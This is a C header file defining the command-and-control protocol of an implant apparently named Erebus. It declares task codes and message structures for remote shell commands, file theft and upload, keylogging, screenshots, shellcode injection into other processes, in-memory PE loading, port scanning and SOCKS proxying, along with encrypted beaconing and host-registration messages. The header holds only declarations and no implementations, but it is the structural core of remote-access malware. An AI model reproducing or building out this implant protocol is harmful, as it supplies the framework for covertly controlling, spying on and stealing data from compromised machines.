#ifndef EREBUS_PB_C2_H
#define EREBUS_PB_C2_H

#include <stddef.h>
#include <stdint.h>
#include "erebus/types.h"

#define EREBUS_TASK_SHELL          1
#define EREBUS_TASK_FILE_DOWNLOAD  2
#define EREBUS_TASK_FILE_UPLOAD    3
#define EREBUS_TASK_PROCESS_LIST   4
#define EREBUS_TASK_PROCESS_KILL   5
#define EREBUS_TASK_NET_IFCONFIG   6
#define EREBUS_TASK_NET_PORTSCAN   7
#define EREBUS_TASK_KEYLOG_START   10
#define EREBUS_TASK_KEYLOG_STOP    11
#define EREBUS_TASK_KEYLOG_DUMP    12
#define EREBUS_TASK_SCREENSHOT     9
#define EREBUS_TASK_INJECT         15
#define EREBUS_TASK_PE_LOAD        16
#define EREBUS_TASK_SOCKS_START    17
#define EREBUS_TASK_SOCKS_STOP     18
#define EREBUS_TASK_EXIT           19
#define EREBUS_TASK_SLEEP          20
#define EREBUS_TASK_MODULE         21

#define EREBUS_MAX_FILE_SIZE (50u << 20)
#define EREBUS_MAX_PORTS     1024

/* Protocol decoder caps (DoS / OOM guard) */
#define EREBUS_MAX_BEACON_TASKS       64
#define EREBUS_MAX_TASK_DATA_LEN      (16u << 20)  /* 16 MiB per task data blob */
#define EREBUS_MAX_ENCRYPTED_TASKS    (32u << 20)  /* 32 MiB encrypted payload */

typedef struct erebus_register_msg {
    char     implant_id[128];
    char     hostname[256];
    char     username[256];
    char     os[32];
    char     arch[32];
    uint32_t pid;
    char     integrity_level[32];
    int64_t  timestamp;
    uint8_t  hmac[32];
    size_t   hmac_len;
} erebus_register_msg;

typedef struct erebus_register_resp {
    int      success;
    char     session_id[64];
    int64_t  next_checkin_ms;
    uint8_t *encrypted_session_key;
    size_t   encrypted_session_key_len;
} erebus_register_resp;

typedef struct erebus_beacon_msg {
    char     implant_id[128];
    char     session_id[64];
    int64_t  timestamp;
    uint8_t  hmac[32];
    size_t   hmac_len;
    uint8_t *encrypted_results;
    size_t   encrypted_results_len;
} erebus_beacon_msg;

typedef struct erebus_beacon_resp {
    erebus_task *tasks;
    size_t       task_count;
    int64_t      next_checkin_ms;
    int          terminate;
    uint8_t     *encrypted_tasks;
    size_t       encrypted_tasks_len;
} erebus_beacon_resp;

typedef struct erebus_shell_task {
    char command[4096];
} erebus_shell_task;

typedef struct erebus_sleep_task {
    int64_t sleep_ms;
    int32_t jitter_pct;
} erebus_sleep_task;

typedef struct erebus_file_download_task {
    char remote_path[1024];
} erebus_file_download_task;

typedef struct erebus_file_upload_task {
    char     remote_path[1024];
    uint8_t *data;
    size_t   data_len;
} erebus_file_upload_task;

typedef struct erebus_process_info {
    uint32_t pid;
    uint32_t ppid;
    char     name[260];
} erebus_process_info;

typedef struct erebus_process_kill_task {
    uint32_t pid;
} erebus_process_kill_task;

typedef struct erebus_net_interface {
    char     name[256];
    char     mac[32];
    uint32_t mtu;
    int      up;
    char   **addresses;
    size_t   address_count;
} erebus_net_interface;

typedef struct erebus_portscan_task {
    char      target[256];
    uint32_t  ports[EREBUS_MAX_PORTS];
    size_t    port_count;
    uint32_t  timeout_ms;
    uint32_t  threads;
} erebus_portscan_task;

typedef struct erebus_port_result {
    char     host[256];
    uint32_t port;
    int      open;
    char     service[256];
} erebus_port_result;

typedef struct erebus_inject_task {
    char     method[64];
    uint32_t target_pid;
    uint8_t *shellcode;
    size_t   shellcode_len;
} erebus_inject_task;

int erebus_pb_encode_register(const erebus_register_msg *m, uint8_t **out, size_t *out_len);
int erebus_pb_decode_register_resp(const uint8_t *in, size_t in_len, erebus_register_resp *m);
void erebus_pb_free_register_resp(erebus_register_resp *m);

int erebus_pb_encode_beacon(const erebus_beacon_msg *m, uint8_t **out, size_t *out_len);
int erebus_pb_decode_beacon_resp(const uint8_t *in, size_t in_len, erebus_beacon_resp *m);
void erebus_pb_free_beacon_resp(erebus_beacon_resp *m);

int erebus_pb_encode_results_payload(erebus_task_result *results, size_t count, uint8_t **out, size_t *out_len);
int erebus_pb_decode_tasks_payload(const uint8_t *in, size_t in_len, erebus_task **tasks, size_t *count);
void erebus_pb_free_tasks(erebus_task *tasks, size_t count);

int erebus_pb_decode_shell_task(const uint8_t *in, size_t in_len, erebus_shell_task *t);
int erebus_pb_encode_shell_result(const char *stdout_s, const char *stderr_s, int32_t exit_code, uint8_t **out, size_t *out_len);
int erebus_pb_decode_sleep_task(const uint8_t *in, size_t in_len, erebus_sleep_task *t);
int erebus_pb_encode_task_result(const erebus_task_result *r, uint8_t **out, size_t *out_len);

int erebus_pb_decode_file_download_task(const uint8_t *in, size_t in_len, erebus_file_download_task *t);
int erebus_pb_decode_file_upload_task(const uint8_t *in, size_t in_len, erebus_file_upload_task *t);
void erebus_pb_free_file_upload_task(erebus_file_upload_task *t);
int erebus_pb_encode_file_download_result(const char *filename, const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int erebus_pb_encode_file_upload_result(int success, uint8_t **out, size_t *out_len);

int erebus_pb_decode_process_kill_task(const uint8_t *in, size_t in_len, erebus_process_kill_task *t);
int erebus_pb_encode_process_list_result(const erebus_process_info *procs, size_t count, uint8_t **out, size_t *out_len);
int erebus_pb_encode_process_kill_result(int success, uint8_t **out, size_t *out_len);

int erebus_pb_encode_net_ifconfig_result(const erebus_net_interface *ifaces, size_t count, uint8_t **out, size_t *out_len);
void erebus_pb_free_net_ifconfig_result(erebus_net_interface *ifaces, size_t count);
int erebus_pb_decode_portscan_task(const uint8_t *in, size_t in_len, erebus_portscan_task *t);
int erebus_pb_encode_portscan_result(const erebus_port_result *ports, size_t count, uint8_t **out, size_t *out_len);

int erebus_pb_decode_inject_task(const uint8_t *in, size_t in_len, erebus_inject_task *t);
void erebus_pb_free_inject_task(erebus_inject_task *t);
int erebus_pb_encode_inject_result(int success, uint32_t pid, uint32_t tid, uint8_t **out, size_t *out_len);
int erebus_pb_encode_screenshot_result(const uint8_t *img, size_t img_len, uint32_t w, uint32_t h, uint8_t **out, size_t *out_len);
int erebus_pb_encode_keylog_dump_result(const void *entries, size_t count, uint8_t **out, size_t *out_len);
int erebus_pb_encode_socks_start_result(int success, uint32_t port, uint8_t **out, size_t *out_len);
int erebus_pb_encode_socks_stop_result(int success, uint8_t **out, size_t *out_len);
int erebus_pb_encode_peload_result(int success, const uint8_t *output, size_t output_len, uint8_t **out, size_t *out_len);

#endif